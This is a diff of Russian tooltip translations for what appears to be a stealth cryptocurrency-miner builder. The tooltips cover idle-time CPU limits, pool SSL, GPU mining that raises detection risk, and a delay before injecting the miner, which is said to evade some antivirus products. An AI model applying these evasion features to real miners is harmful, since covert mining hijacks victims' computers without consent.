@@ -7,7 +7,7 @@
 247 Me.TooltipHelper.SetToolTip(Me.Label21, "The amount of CPU the.... -- Процент использования ресурсов процессора во время простоя компьютера
 260 Me.TooltipHelper.SetToolTip(Me.Label17, "SSL/TLS increases perfo... -- Протокол SSL/TLS повышает стабильность но используется не на всех пулах. Обязательно посмотри поддерживается ли он на твоем пуле, если он тебе нужен, конечно
 275 Me.TooltipHelper.SetToolTip(Me.Label16, "Only enable if mining... -- Включай если используешь nicehash.com или там где используется что-то вроде xmrig-porxy
-289 Me.TooltipHelper.SetToolTip(Me.Label14, "GPU Mining for some... -- Из названия понятно, что оно используется для майнинга на видеокартах, что тут еще можно сказать, задетектить майнер становится легче, вот что, да и размер файла майнера становится больше
+289 Me.TooltipHelper.SetToolTip(Me.Label14, "GPU Mining for some... -- Майнинг на видеокарте, задетектить майнер становится легче, размер файла майнера становится больше
 317 Me.TooltipHelper.SetToolTip(Me.helpLabelMaxCPU, "The max amount.... -- Максимальное значение использования ресурсов процессора
 330 Me.TooltipHelper.SetToolTip(Me.Label28, "The time to wait before injecting... -- Время ожидания перед внедрением и запуском майнера. Иногда обходит некоторые антивирусы
 
